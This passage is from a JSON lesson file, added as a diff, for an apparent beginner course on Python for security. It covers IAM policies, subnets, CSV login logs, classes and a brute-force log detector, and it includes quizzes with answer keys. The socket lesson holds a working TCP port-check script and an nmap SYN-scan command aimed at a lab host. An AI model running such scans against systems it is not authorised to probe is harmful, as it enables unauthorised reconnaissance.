+    "code": "import json\npolicy = '{\"Version\": \"2012-10-17\", \"Statement\": [{\"Effect\": \"Allow\", \"Action\": \"s3:GetObject\", \"Resource\": \"arn:aws:s3:::reports/*\"}, {\"Effect\": \"Allow\", \"Action\": \"*\", \"Resource\": \"*\"}]}'\ndoc = json.loads(policy)\nfor st in doc[\"Statement\"]:\n    print(st[\"Effect\"], st[\"Action\"], st[\"Resource\"])"
+   },
+   "real": [
+    "On the job",
+    "Cloud security reviews often start with \"find every policy that allows `*`\". A short script can check the exported IAM policies for hundreds of roles at once."
+   ],
+   "myth": [
+    "JSON is a Python thing.",
+    "JSON works with almost every language, and it's used everywhere on the web. Python just maps it neatly onto dictionaries and lists."
+   ],
+   "quiz": [
+    {
+     "d": 2,
+     "run": true,
+     "q": "What does this print?",
+     "code": "import json\nprint(json.loads('{\"user\": \"kali\", \"fails\": 3}')[\"fails\"])",
+     "o": [
+      "3",
+      "\"3\"",
+      "fails"
+     ],
+     "k": 0,
+     "w": "3. JSON whole numbers become Python integers, so you get the number 3. Not \"3\": print doesn't show quotes around text anyway. Not fails: that's the key, and indexing gives its value."
+    },
+    {
+     "d": 1,
+     "q": "What does this print?",
+     "run": true,
+     "code": "import json\ndoc = json.loads('{\"Statement\": [{\"Action\": \"*\"}, {\"Action\": \"s3:GetObject\"}]}')\nprint(len(doc[\"Statement\"]))",
+     "o": [
+      "0",
+      "1",
+      "2"
+     ],
+     "k": 2,
+     "w": "2. The Statement list holds two entries, so `len()` returns 2. Not 1: the wildcard entry is only one of the two. Not 0: the list isn't empty."
+    },
+    {
+     "d": 2,
+     "q": "Why is `\"Effect\": \"Allow\"` with `\"Action\": \"*\"` on `\"Resource\": \"*\"` a problem?",
+     "o": [
+      "It's invalid JSON",
+      "It allows everything",
+      "It denies everything"
+     ],
+     "k": 1,
+     "w": "It allows everything: admin-level rights, the opposite of least privilege. An explicit Deny, permissions boundary or service control policy (SCP) can still limit it. Not denies: the Effect is Allow. Not invalid: the JSON parses fine."
+    }
+   ],
+   "challenge": {
+    "p": "Print `WARNING: wildcard action` for every statement whose Action is `\"*\"`.",
+    "start": "import json\npolicy = '{\"Version\": \"2012-10-17\", \"Statement\": [{\"Effect\": \"Allow\", \"Action\": \"s3:GetObject\", \"Resource\": \"arn:aws:s3:::reports/*\"}, {\"Effect\": \"Allow\", \"Action\": \"*\", \"Resource\": \"*\"}]}'\ndoc = json.loads(policy)\n",
+    "hint": "Loop over `doc[\"Statement\"]` and check `st[\"Action\"] == \"*\"`. A real checker would also catch `[\"*\"]` and `\"s3:*\"`.",
+    "solution": "import json\npolicy = '{\"Version\": \"2012-10-17\", \"Statement\": [{\"Effect\": \"Allow\", \"Action\": \"s3:GetObject\", \"Resource\": \"arn:aws:s3:::reports/*\"}, {\"Effect\": \"Allow\", \"Action\": \"*\", \"Resource\": \"*\"}]}'\ndoc = json.loads(policy)\nfor st in doc[\"Statement\"]:\n    if st[\"Action\"] == \"*\":\n        print(\"WARNING: wildcard action\")",
+    "expect": "WARNING: wildcard action"
+   },
+   "recap": [
+    "`json.loads` turns JSON text into Python data.",
+    "Reach into nested data one key at a time.",
+    "IAM policies are JSON statements.",
+    "`\"Action\": \"*\"` breaks least privilege.",
+    "`json.dumps(data, indent=2)` makes JSON readable."
+   ]
+  },
+  {
+   "t": "The ipaddress module",
+   "sub": "Subnets and private ranges without mistakes.",
+   "learn": [
+    [
+     "Key terms",
+     "Subnet: a smaller network carved out of a bigger one.\nPrivate address: an IP address reserved for use inside private networks.\nDocumentation range: an IP range reserved for examples, such as 203.0.113.0/24.\nGlobal address: an IP address that's reachable on the public internet."
+    ],
+    [
+     "The ipaddress module",
+     "The `ipaddress` module understands IPv4 and IPv6. It tells you whether an address is private, and whether it sits inside a network. You don't have to split addresses on the dots by hand.",
+     "import ipaddress\nip = ipaddress.ip_address(\"10.10.10.20\")\nprint(ip.is_private, ip in ipaddress.ip_network(\"10.10.10.0/24\"))"
+    ],
+    [
+     "Networks",
+     "`ipaddress.ip_network(\"10.10.10.0/24\")` is a subnet. `ip in net` checks whether an address is inside it. `net.num_addresses` tells you its size.",
+     "import ipaddress\nnet = ipaddress.ip_network(\"10.10.10.0/24\")\nprint(net.num_addresses, ipaddress.ip_address(\"10.10.10.20\") in net)"
+    ],
+    [
+     "Private means more than RFC 1918",
+     "`is_private` covers more than the private ranges in Request for Comments (RFC) 1918. It also covers documentation ranges like 203.0.113.0/24. This track uses that range for sample attackers."
+    ],
+    [
+     "Use is_global for the internet",
+     "To ask \"is this on the internet?\", use `is_global`. It's the stricter test, and documentation addresses fail it too."
+    ]
+   ],
+   "play": {
+    "p": "Try different addresses and networks.",
+    "code": "import ipaddress\nnet = ipaddress.ip_network(\"192.168.1.0/28\")\nfor ip in [\"192.168.1.5\", \"192.168.1.20\", \"8.8.8.8\"]:\n    a = ipaddress.ip_address(ip)\n    print(ip, a in net, a.is_private)"
+   },
+   "real": [
+    "On the job",
+    "A security information and event management (SIEM) system exports 300 alerts as JavaScript Object Notation (JSON). A script loads them and keeps the ones whose source IP isn't private. It prints a short list of external addresses to check against threat intelligence."
+   ],
+   "tryit": {
+    "h": "Filter alerts by source",
+    "where": "Kali: python3",
+    "p": "Load a small list of alerts. Print only the ones from internet addresses, using `is_global`.",
+    "code": "import json, ipaddress\ndata = '[{\"src\": \"10.10.10.10\"}, {\"src\": \"1.1.1.1\"}, {\"src\": \"8.8.8.8\"}]'\nfor alert in json.loads(data):\n    if ipaddress.ip_address(alert[\"src\"]).is_global:\n        print(\"external:\", alert[\"src\"])"
+   },
+   "myth": [
+    "Working out subnets by hand is safer.",
+    "Working them out by hand is where mistakes happen. The ipaddress module gets /27s and /29s right every time."
+   ],
+   "quiz": [
+    {
+     "d": 1,
+     "run": true,
+     "q": "What does this print?",
+     "code": "import ipaddress\nprint(ipaddress.ip_address(\"8.8.8.8\").is_private)",
+     "o": [
+      "True",
+      "False",
+      "An error"
+     ],
+     "k": 1,
+     "w": "False. 8.8.8.8 is a public internet address, so it isn't private. Not True: it isn't in any private or reserved range. Not an error: `is_private` works on any valid address."
+    },
+    {
+     "d": 2,
+     "run": true,
+     "q": "What does this print?",
+     "code": "import ipaddress\nnet = ipaddress.ip_network(\"192.168.1.0/26\")\nprint(ipaddress.ip_address(\"192.168.1.70\") in net)",
+     "o": [
+      "False",
+      "True",
+      "An error"
+     ],
+     "k": 0,
+     "w": "False. A /26 starting at .0 covers .0 to .63, so .70 is outside it. Not True: .70 falls in the next /26. Not an error: checking an address against a network is valid."
+    },
+    {
+     "d": 2,
+     "q": "What does this print?",
+     "run": true,
+     "code": "import ipaddress\nprint(ipaddress.ip_network(\"192.168.1.0/28\").num_addresses)",
+     "o": [
+      "14",
+      "16",
+      "32"
+     ],
+     "k": 1,
+     "w": "16. A /28 leaves 4 host bits, and 2 to the power of 4 is 16. Not 14: that's the usable host count, but `num_addresses` counts every address. Not 32: that's the size of a /27."
+    }
+   ],
+   "challenge": {
+    "p": "Print only the addresses that are inside `10.10.10.0/24`, one per line.",
+    "start": "import ipaddress\nnet = ipaddress.ip_network(\"10.10.10.0/24\")\nips = [\"10.10.10.5\", \"10.10.20.5\", \"10.10.10.200\"]\n",
+    "hint": "Loop, convert each with `ipaddress.ip_address(ip)`, and test `in net`.",
+    "solution": "import ipaddress\nnet = ipaddress.ip_network(\"10.10.10.0/24\")\nips = [\"10.10.10.5\", \"10.10.20.5\", \"10.10.10.200\"]\nfor ip in ips:\n    if ipaddress.ip_address(ip) in net:\n        print(ip)",
+    "expect": "10.10.10.5\n10.10.10.200"
+   },
+   "recap": [
+    "`ip_address` and `ip_network` do the maths for you.",
+    "`ip in net` checks membership.",
+    "`num_addresses` gives a subnet's size.",
+    "`is_private` includes documentation ranges.",
+    "`is_global` is stricter than `not is_private`."
+   ]
+  },
+  {
+   "t": "List comprehensions",
+   "sub": "Filter and transform a list in one line.",
+   "learn": [
+    [
+     "Key terms",
+     "List comprehension: a one-line way to build a new list from another list.\nTransform: to change each item, such as making it upper case.\nNested loop: a loop inside another loop."
+    ],
+    [
+     "The pattern",
+     "A list comprehension, `[x for x in items if condition]`, builds a new list. It's the loop and if from Lesson 5, written in one line.",
+     "ports = [21, 22, 80, 443]\nprint([p for p in ports if p < 100])"
+    ],
+    [
+     "Transforming",
+     "The first part can transform each item. For example, `[ip.strip() for ip in lines]` cleans every line at once."
+    ],
+    [
+     "Keep them readable",
+     "If a comprehension needs two conditions and a nested loop, a normal for loop is clearer. Readable beats clever."
+    ]
+   ],
+   "play": {
+    "p": "Change the condition, or transform each item, for example `p + 1`.",
+    "code": "ports = [21, 22, 23, 80, 443, 3389]\nprint([p for p in ports if p in (21, 23)])\nprint([f\"port-{p}\" for p in ports[:2]])"
+   },
+   "real": [
+    "On the job",
+    "You can often turn 300 extracted IPs into a clean list of internet IPs with one comprehension: `[ip for ip in ips if ipaddress.ip_address(ip).is_global]`."
+   ],
+   "quiz": [
+    {
+     "d": 1,
+     "q": "What does this print?",
+     "run": true,
+     "code": "print([n for n in [1, 2, 3, 4] if n % 2 == 0])",
+     "o": [
+      "[1, 3]",
+      "[2, 4]",
+      "[1, 2, 3, 4]"
+     ],
+     "k": 1,
+     "w": "[2, 4]. Only even numbers pass the `n % 2 == 0` condition. Not [1, 3]: those are the odd numbers, which fail it. Not [1, 2, 3, 4]: the if filters the list, so some items are dropped."
+    },
+    {
+     "d": 1,
+     "q": "What does this print?",
+     "run": true,
+     "code": "print([s.upper() for s in [\"a\", \"b\"]])",
+     "o": [
+      "AB",
+      "['a', 'b']",
+      "['A', 'B']"
+     ],
+     "k": 2,
+     "w": "['A', 'B']. The first part calls `.upper()` on each item, and the result is a list. Not ['a', 'b']: each item was changed. Not AB: a comprehension builds a list, not one joined string."
+    },
+    {
+     "d": 2,
+     "q": "When is a normal for loop better than a comprehension?",
+     "o": [
+      "When the list is short",
+      "When the logic is complex",
+      "When the list is very long"
+     ],
+     "k": 1,
+     "w": "When the logic is complex. Comprehensions suit simple filters and changes, and complex logic reads better as a loop. Not list length: comprehensions work for short and long lists alike."
+    }
+   ],
+   "challenge": {
+    "p": "Use a comprehension to keep only the usernames that start with `adm`, then print the list.",
+    "start": "users = [\"admin\", \"kane\", \"adm-backup\", \"guest\"]\n",
+    "hint": "`[u for u in users if u.startswith(\"adm\")]`",
+    "solution": "users = [\"admin\", \"kane\", \"adm-backup\", \"guest\"]\nprint([u for u in users if u.startswith(\"adm\")])",
+    "expect": "['admin', 'adm-backup']"
+   },
+   "recap": [
+    "`[x for x in items if test]` filters.",
+    "The first part can transform each item.",
+    "Use comprehensions for simple jobs; readable beats clever."
+   ]
+  },
+  {
+   "t": "Caesar cipher",
+   "sub": "A classic cipher, and why it's easy to break.",
+   "learn": [
+    [
+     "Key terms",
+     "Cipher: a method for encrypting and decrypting text.\nKey space: all the possible keys a cipher can use.\nModulo: the % operator, which gives the remainder after division, such as 27 % 26 = 1."
+    ],
+    [
+     "Shifting letters",
+     "A Caesar cipher shifts each letter a fixed number of places. With a shift of 3, A becomes D. It's a teaching cipher, not real security."
+    ],
+    [
+     "Letters as numbers",
+     "`ord(\"a\")` is 97, and `chr(97)` is \"a\". So you can turn a letter into a number, do maths on it and turn it back.",
+     "print(ord(\"a\"), chr(100))"
+    ],
+    [
+     "The shift formula",
+     "Shift a letter with `(ord(c) - 97 + k) % 26 + 97`, where k is the key. The `% 26` wraps z back round to a."
+    ],
+    [
+     "Why it's weak",
+     "There are only 25 possible shifts, so a loop can try them all in moments. Trying every key like this is a brute-force attack on the key space."
+    ]
+   ],
+   "play": {
+    "p": "Change the message or the shift. A shift of -3 decrypts.",
+    "code": "def caesar(text, k):\n    out = \"\"\n    for c in text:\n        if c.islower():\n            out += chr((ord(c) - 97 + k) % 26 + 97)\n        else:\n            out += c\n    return out\n\nprint(caesar(\"attack at dawn\", 3))\nprint(caesar(\"dwwdfn dw gdzq\", -3))"
+   },
+   "real": [
+    "On the job",
+    "Nobody uses Caesar ciphers for real security. But capture the flag (CTF) challenges and malware analysis often involve simple shifts and exclusive OR (XOR) used to hide strings. Spotting and reversing them is a useful skill."
+   ],
+   "myth": [
+    "A secret algorithm keeps data safe.",
+    "Security should rest on the key, not on hiding the method. This is Kerckhoffs's principle. Caesar's method being public isn't the problem. Its key space is tiny, so the key can't protect anything."
+   ],
+   "quiz": [
+    {
+     "d": 1,
+     "q": "What does this print?",
+     "run": true,
+     "code": "print(chr((ord(\"a\") - 97 + 3) % 26 + 97))",
+     "o": [
+      "a",
+      "c",
+      "d"
+     ],
+     "k": 2,
+     "w": "d. a is position 0, and a shift of 3 lands on position 3, which is d. Not c: that's a shift of 2. Not a: that would be no shift at all."
+    },
+    {
+     "d": 2,
+     "q": "What does this print?",
+     "run": true,
+     "code": "print(chr((ord(\"z\") - 97 + 2) % 26 + 97))",
+     "o": [
+      "b",
+      "z",
+      "|"
+     ],
+     "k": 0,
+     "w": "b. `% 26` wraps past z back to the start, so z shifted by 2 is b. Not |: without `% 26` you'd run past z into symbols. Not z: a shift of 2 does change the letter."
+    },
+    {
+     "d": 1,
+     "q": "How many useful keys does a Caesar cipher on a to z have?",
+     "o": [
+      "25",
+      "26",
+      "256"
+     ],
+     "k": 0,
+     "w": "25. A shift of 26 gets you back where you started, so only 25 shifts change anything. Not 26: one of those shifts changes nothing. Not 256: that's the number of values in one byte."
+    }
+   ],
+   "challenge": {
+    "p": "Brute-force it. Print the key (the shift) that turned `hello` into `khoor`.",
+    "start": "def caesar(text, k):\n    return \"\".join(chr((ord(c) - 97 + k) % 26 + 97) for c in text)\n\nsecret = \"khoor\"\n",
+    "hint": "Loop `for k in range(26):` and print k when `caesar(secret, -k) == \"hello\"`.",
+    "solution": "def caesar(text, k):\n    return \"\".join(chr((ord(c) - 97 + k) % 26 + 97) for c in text)\n\nsecret = \"khoor\"\nfor k in range(26):\n    if caesar(secret, -k) == \"hello\":\n        print(k)",
+    "expect": "3"
+   },
+   "recap": [
+    "Caesar shifts letters by a fixed key.",
+    "`ord` and `chr` turn letters into numbers and back.",
+    "`% 26` wraps around the alphabet.",
+    "A tiny key space falls to brute force.",
+    "Security rests on the key, not a secret method."
+   ]
+  },
+  {
+   "t": "Reading a CSV of logins",
+   "sub": "Spreadsheet exports are everywhere in security.",
+   "learn": [
+    [
+     "Key terms",
+     "Comma-separated values (CSV): a text format for tables, with one row per line and commas between fields.\nHeader row: the first row of a CSV file, which names each column.\nCSV injection: a spreadsheet formula hidden in a CSV cell that can run when someone opens the file."
+    ],
+    [
+     "The csv module",
+     "Python's csv module reads comma-separated values (CSV) files. `csv.DictReader` turns each row into a dictionary, keyed by the header row. So you can write `row[\"user\"]` instead of counting columns."
+    ],
+    [
+     "Files or text",
+     "On Kali, you'd use `open(\"logins.csv\", newline=\"\")`. In the app, `io.StringIO(data)` makes a string behave like a file, so you can practise here."
+    ],
+    [
+     "Why not split on commas",
+     "A field like `\"Smith, Jane\"` contains a comma. The csv module handles the quotes correctly, but `.split(\",\")` breaks the field in two."
+    ],
+    [
+     "CSV injection",
+     "A cell that starts with `=`, `+`, `-` or `@` can run as a formula when someone opens the CSV in Excel. If you export log data to CSV, attackers can plant those characters in usernames or URLs."
+    ]
+   ],
+   "play": {
+    "p": "Print a different column, or filter on `result`.",
+    "code": "import csv, io\ndata = \"\"\"time,user,result,src\n09:01,kane,success,10.10.10.10\n09:02,root,fail,203.0.113.7\n09:02,root,fail,203.0.113.7\n09:03,admin,fail,198.51.100.23\"\"\"\nfor row in csv.DictReader(io.StringIO(data)):\n    print(row[\"user\"], row[\"result\"])"
+   },
+   "real": [
+    "On the job",
+    "Many tools, including Microsoft Entra ID and Okta, can export sign-in logs as CSV. For a one-off question, a short script is often faster than a security information and event management (SIEM) query. It just counts failures per user."
+   ],
+   "myth": [
+    "CSV is just text, so `.split(\",\")` is enough.",
+    "Quoted fields can even contain line breaks, which splitting line by line gets wrong. Use the csv module and avoid subtle bugs."
+   ],
+   "quiz": [
+    {
+     "d": 1,
+     "q": "What does this print?",
+     "run": true,
+     "code": "import csv, io\ndata = \"user,result\\nkane,success\\nroot,fail\"\nrows = list(csv.DictReader(io.StringIO(data)))\nprint(rows[1][\"user\"])",
+     "o": [
+      "kane",
+      "root",
+      "user"
+     ],
+     "k": 1,
+     "w": "root. DictReader uses the header as keys, so `rows[1]` is root. Not kane: that's index 0. Not user: the header isn't a data row."
+    },
+    {
+     "d": 2,
+     "q": "What does this print?",
+     "run": true,
+     "code": "import csv, io\nprint(next(csv.reader(io.StringIO('\"Smith, Jane\",admin'))))",
+     "o": [
+      "An error",
+      "['Smith, Jane', 'admin']",
+      "['\"Smith', ' Jane\"', 'admin']"
+     ],
+     "k": 1,
+     "w": "['Smith, Jane', 'admin']. The csv module keeps the quoted name together as one field. Not the three-part list: that's what splitting on commas by hand gives. Not an error: a quoted comma is valid CSV."
+    },
+    {
+     "d": 1,
+     "q": "What does `csv.DictReader` use as the keys?",
+     "o": [
+      "Row numbers",
+      "The header row",
+      "The first column"
+     ],
+     "k": 1,
+     "w": "The header row. Each row becomes a dictionary keyed by the header names. Not row numbers: DictReader names fields, not positions. Not the first column: it's data, read into each dictionary like the other columns."
+    }
+   ],
+   "challenge": {
+    "p": "Count the failed logins and print `3 failed`.",
+    "start": "import csv, io\ndata = \"\"\"time,user,result,src\n09:01,kane,success,10.10.10.10\n09:02,root,fail,203.0.113.7\n09:02,root,fail,203.0.113.7\n09:03,admin,fail,198.51.100.23\"\"\"\n",
+    "hint": "Loop over the DictReader and add 1 when `row[\"result\"] == \"fail\"`.",
+    "solution": "import csv, io\ndata = \"\"\"time,user,result,src\n09:01,kane,success,10.10.10.10\n09:02,root,fail,203.0.113.7\n09:02,root,fail,203.0.113.7\n09:03,admin,fail,198.51.100.23\"\"\"\nfails = 0\nfor row in csv.DictReader(io.StringIO(data)):\n    if row[\"result\"] == \"fail\":\n        fails += 1\nprint(fails, \"failed\")",
+    "expect": "3 failed"
+   },
+   "recap": [
+    "`csv.DictReader` gives each row as a dictionary.",
+    "Use `newline=\"\"` when opening CSV files.",
+    "Don't split on commas by hand.",
+    "Cells starting with `=`, `+`, `-` or `@` can run as formulas.",
+    "Sign-in exports are often CSV."
+   ]
+  },
+  {
+   "t": "Simple classes",
+   "sub": "Bundle data and the code that uses it.",
+   "learn": [
+    [
+     "Key terms",
+     "Class: a blueprint that describes what its objects hold and can do.\nObject: one item made from a class, with its own data.\nSoftware development kit (SDK): ready-made code for working with a service from your own programs."
+    ],
+    [
+     "What a class is",
+     "A class is a blueprint. `class Alert:` describes what every alert has (its data) and can do (its methods). Each alert you create is an object."
+    ],
+    [
+     "__init__ and self",
+     "`__init__` runs when you create an object. It stores the object's data on `self`, so `self.ip` is this alert's IP.",
+     "class Alert:\n    def __init__(self, ip, score):\n        self.ip = ip\n        self.score = score\n\na = Alert(\"203.0.113.7\", 8)\nprint(a.ip, a.score)"
+    ],
+    [
+     "Methods",
+     "A method is a function inside a class that uses `self`. Calling `a.is_high()` reads naturally. It also keeps the rule next to the data it checks."
+    ]
+   ],
+   "play": {
+    "p": "Create another alert with a different score and check it.",
+    "code": "class Alert:\n    def __init__(self, ip, score):\n        self.ip = ip\n        self.score = score\n\n    def is_high(self):\n        return self.score >= 7\n\na = Alert(\"203.0.113.7\", 8)\nb = Alert(\"10.10.10.20\", 3)\nprint(a.ip, a.is_high())\nprint(b.ip, b.is_high())"
+   },
+   "real": [
+    "On the job",
+    "Security tools and software development kits (SDKs) hand you objects with methods. For example, boto3 gives you client and resource objects. Writing a small class yourself makes their documentation far easier to read."
+   ],
+   "quiz": [
+    {
+     "d": 1,
+     "q": "What does this print?",
+     "run": true,
+     "code": "class Alert:\n    def __init__(self, ip, score):\n        self.ip = ip\n        self.score = score\n\na = Alert(\"1.2.3.4\", 8)\nprint(a.score)",
+     "o": [
+      "8",
+      "Alert",
+      "score"
+     ],
+     "k": 0,
+     "w": "8. `__init__` stored 8 as `self.score`, and `a.score` reads it back. Not Alert or score: those are names, not the stored value."
+    },
+    {
+     "d": 2,
+     "q": "What does this print?",
+     "run": true,
+     "code": "class Alert:\n    def __init__(self, score):\n        self.score = score\n    def is_high(self):\n        return self.score >= 7\n\nprint(Alert(3).is_high())",
+     "o": [
+      "None",
+      "True",
+      "False"
+     ],
+     "k": 2,
+     "w": "False. 3 is less than 7, so `is_high` returns False. Not True: that needs 7 or more. Not None: the method returns a value."
+    },
+    {
+     "d": 1,
+     "q": "What does `self` refer to inside a method?",
+     "o": [
+      "The class it belongs to",
+      "The last object created",
+      "The object it's called on"
+     ],
+     "k": 2,
+     "w": "The object it's called on. `a.is_high()` passes `a` in as `self`. Not the class: each object gets its own `self`. Not the last object created: `self` is whichever object you call the method on."
+    }
+   ],
+   "challenge": {
+    "p": "Add a method `label()` that returns `\"HIGH\"` when the score is 7 or more, and `\"LOW\"` otherwise. Then print `Alert(\"1.2.3.4\", 9).label()`.",
+    "start": "class Alert:\n    def __init__(self, ip, score):\n        self.ip = ip\n        self.score = score\n\nprint(Alert(\"1.2.3.4\", 9).label())",
+    "hint": "Inside the class, add `def label(self):` and return \"HIGH\" if `self.score >= 7`.",
+    "solution": "class Alert:\n    def __init__(self, ip, score):\n        self.ip = ip\n        self.score = score\n\n    def label(self):\n        return \"HIGH\" if self.score >= 7 else \"LOW\"\n\nprint(Alert(\"1.2.3.4\", 9).label())",
+    "expect": "HIGH"
+   },
+   "recap": [
+    "A class is a blueprint; objects are made from it.",
+    "`__init__` stores data on `self`.",
+    "Methods are functions that use `self`.",
+    "SDKs like boto3 are full of objects."
+   ]
+  },
+  {
+   "t": "Sockets and boto3 on Kali",
+   "sub": "Some code can't run in a browser, and shouldn't.",
+   "learn": [
+    [
+     "Key terms",
+     "Sandbox: a protected area where code runs without access to the rest of your computer.\nSocket: one end of a network connection, identified by an IP address and port.\nTimeout: how long code waits for a reply before it gives up.\nboto3: the official Amazon Web Services (AWS) software development kit (SDK) for Python."
+    ],
+    [
+     "The browser sandbox",
+     "In this app, Python runs inside your browser. The browser can't open raw network connections, read your files or use your Amazon Web Services (AWS) keys. That's a safety feature."
+    ],
+    [
+     "A tiny port check",
+     "This script loops over a few ports and reports the open ones. It's a Transmission Control Protocol (TCP) connect check, so the full handshake completes.",
+     "import socket\nhost = \"10.10.10.20\"\nfor port in [22, 135, 445, 3389]:\n    s = socket.socket()\n    s.settimeout(1)\n    if s.connect_ex((host, port)) == 0:\n        print(port, \"open\")\n    s.close()"
+    ],
+    [
+     "Connect scans and SYN scans",
+     "Nmap's default scan depends on whether you run it as root, the admin account. As root, it does a SYN scan: it sends only the first packet (SYN) and never finishes the handshake. Without root, it does a connect scan, which completes the handshake like the port-check script."
+    ],
+    [
+     "Always set a timeout",
+     "Without a timeout, a filtered port can hang your script for a long time. `s.settimeout(1)` gives up after a second. Close each socket when you're done with it."
+    ],
+    [
+     "What boto3 is",
+     "boto3 is the official AWS software development kit (SDK) for Python. Cloud security teams use it to audit settings across many accounts and services."
+    ],
+    [
+     "Installing boto3 on Kali",
+     "On Kali, install boto3 with `sudo apt install python3-boto3`. Plain pip is blocked outside a virtual environment."
+    ],
+    [
+     "Where credentials come from",
+     "boto3 finds credentials from an Identity and Access Management (IAM) role, `aws configure sso` or environment variables. Prefer short-lived credentials over long-term access keys. Never put keys in your code."
+    ],
+    [
+     "A role for audits",
+     "For audits, use a role with the AWS-managed SecurityAudit policy. Give an audit script read-only access, so a leak can't change anything."
+    ],
+    [
+     "Files need a real machine too",
+     "The browser can't read your files either. On Kali, `open(path, \"w\")` replaces a file's contents. `\"a\"` adds to the end instead, so use `\"a\"` for logs you add to."
+    ]
+   ],
+   "real": [
+    "On the job",
+    "Misconfigured cloud storage is behind many data exposures. It's A02 in the 2025 Open Worldwide Application Security Project (OWASP) Top 10. A short boto3 script that flags buckets without a public access block is a classic cloud security interview project."
+   ],
+   "myth": [
+    "Writing your own scanner makes you stealthier than Nmap.",
+    "A connect scan is noisier than a SYN scan, and the target can easily log it. Use Python for automation, not stealth."
+   ],
+   "tryit": {
+    "h": "Check your target's ports",
+    "where": "Kali, against the Windows target",
+    "p": "Only scan your own lab virtual machines (VMs). Save the port check code as portcheck.py and run it. Then compare the result with `sudo nmap -sS -p 22,135,445,3389 10.10.10.20`.",
+    "code": "python3 portcheck.py\nsudo nmap -sS -p 22,135,445,3389 10.10.10.20"
+   },
+   "quiz": [
+    {
+     "d": 1,
+     "q": "What does `connect_ex` return when a port is open?",
+     "o": [
+      "0",
+      "1",
+      "True"
+     ],
+     "k": 0,
+     "w": "0. `connect_ex` returns an error number, and 0 means no error: the connection worked. Not 1: a non-zero number means the connection failed. Not True: it returns a number, not True or False."
+    },
+    {
+     "d": 2,
+     "q": "Why call `s.settimeout(1)` before connecting?",
+     "o": [
+      "To encrypt the connection",
+      "To hide the scan from logs",
+      "To stop filtered ports hanging"
+     ],
+     "k": 2,
+     "w": "To stop filtered ports hanging. A firewall that silently drops packets never answers, and the timeout stops your script waiting. Not encryption or hiding: a timeout only limits how long the script waits."
+    },
+    {
+     "d": 1,
+     "q": "Where should a boto3 script get its AWS credentials?",
+     "o": [
+      "From a comment in the script",
+      "From an IAM role or environment",
+      "Hard-coded at the top of the script"
+     ],
+     "k": 1,
+     "w": "From an IAM role or the environment, which keeps keys out of the code. `aws configure` works too. Not hard-coded or in a comment: keys in code leak through repos and screenshots."
+    },
+    {
+     "d": 2,
+     "q": "Why give an audit script a read-only role?",
+     "o": [
+      "Read-only roles run faster",
+      "AWS requires it for scripts",
+      "A leak can't change anything"
+     ],
+     "k": 2,
+     "w": "A leak can't change anything. Least privilege limits the damage if the script or its credentials are compromised. Not speed: permissions don't change how fast calls run. Not an AWS rule: you choose a role's permissions."
+    },
+    {
+     "d": 2,
+     "q": "You open report.txt with mode \"w\". What happens to what was already in it?",
+     "o": [
+      "It's replaced",
+      "Python refuses to open it",
+      "New text is added to the end"
+     ],
+     "k": 0,
+     "w": "It's replaced. \"w\" empties the file before writing. Not added to the end: that's what \"a\" does. Not refused: Python opens an existing file in \"w\" mode without complaint."
+    }
+   ],
+   "challenge": {
+    "think": true,
+    "p": "Don't run anything. What should a boto3 audit script use for credentials? Which permissions should its role have?",
+    "hint": "Think about where secrets should never live, and about least privilege.",
+    "solution": "Credentials from an IAM role or `aws configure` (never hard-coded in the script), and a read-only role with only the permissions the audit needs."
+   },
+   "recap": [
+    "Browsers can't open sockets or read your AWS keys.",
+    "A connect check completes the TCP handshake. Always set a timeout.",
+    "boto3 gets credentials from the environment or a role.",
+    "Audit with read-only roles, in accounts you own.",
+    "Mode \"w\" replaces a file; \"a\" adds to it."
+   ]
+  },
+  {
+   "t": "Project: brute-force detector",
+   "sub": "Put the whole track together in one tool.",
+   "learn": [
+    [
+     "Key terms",
+     "Command-line argument: a value you type after the script name, such as ssh.log.\nargparse: a Python module that turns command-line arguments into named values.\nThreshold: the count at which a tool raises an alert.\nREADME: a text file that explains what a project does and how to use it."
+    ],
+    [
+     "The goal",
+     "Your tool reads a Secure Shell (SSH) log and finds failed logins. It counts them per source IP and prints the IPs at or over a threshold. It uses files, regex, Counter, error handling and argparse."
+    ],
+    [
+     "The plan",
+     "Break the job into steps before writing code. Get the arguments, open the file safely, match each line, count, then report. Each step is a few lines you already know."
+    ],
+    [
+     "Command-line arguments",
+     "`argparse` turns `python3 tool.py ssh.log --threshold 5` into named values. You get help text for free. You can then reuse the script without editing the code.",
+     "import argparse\np = argparse.ArgumentParser(description=\"Count failed logins\")\np.add_argument(\"logfile\")\np.add_argument(\"--threshold\", type=int, default=5)\nargs = p.parse_args()\nprint(args.logfile, args.threshold)"
+    ],
+    [
+     "Practise here, then use Kali",
+     "Write the core here against the sample log. Then add argparse and file reading on Kali, as in the Try it card."
+    ]
+   ],
+   "play": {
+    "p": "This is the core of the detector. Change the threshold and run it.",
+    "code": "import re\nfrom collections import Counter\nLOG = \"\"\"Nov 17 09:14:01 kali sshd[812]: Failed password for root from 203.0.113.7 port 50122 ssh2\nNov 17 09:14:05 kali sshd[812]: Failed password for root from 203.0.113.7 port 50124 ssh2\nNov 17 09:15:12 kali sshd[815]: Accepted publickey for kane from 10.10.10.10 port 51000 ssh2\nNov 17 09:16:40 kali sshd[818]: Failed password for invalid user admin from 198.51.100.23 port 40001 ssh2\nNov 17 09:16:44 kali sshd[818]: Failed password for root from 203.0.113.7 port 50130 ssh2\"\"\"\npattern = re.compile(r\"Failed password .* from (\\S+)\")\ncounts = Counter()\nfor line in LOG.splitlines():\n    m = pattern.search(line)\n    if m:\n        counts[m.group(1)] += 1\nfor ip, n in counts.most_common():\n    if n >= 2:\n        print(f\"{ip} {n} failures\")"
+   },
+   "real": [
+    "On the job",
+    "Interviewers love a small, working tool you can explain line by line. \"I wrote a script that finds brute-force sources in SSH logs\" shows Python, log analysis and security thinking at once."
+   ],
+   "myth": [
+    "Portfolio projects have to be big to count.",
+    "A small tool with a clear README, sample output and an honest list of limitations beats an unfinished large one."
+   ],
+   "tryit": {
+    "h": "Build the detector",
+    "where": "Kali: save as bruteforce.py",
+    "p": "Start SSH and fail a few logins with `ssh nobody@localhost`. Then run `sudo journalctl -u ssh > ssh.log` and `python3 bruteforce.py ssh.log --threshold 2`. Stop SSH afterwards.",
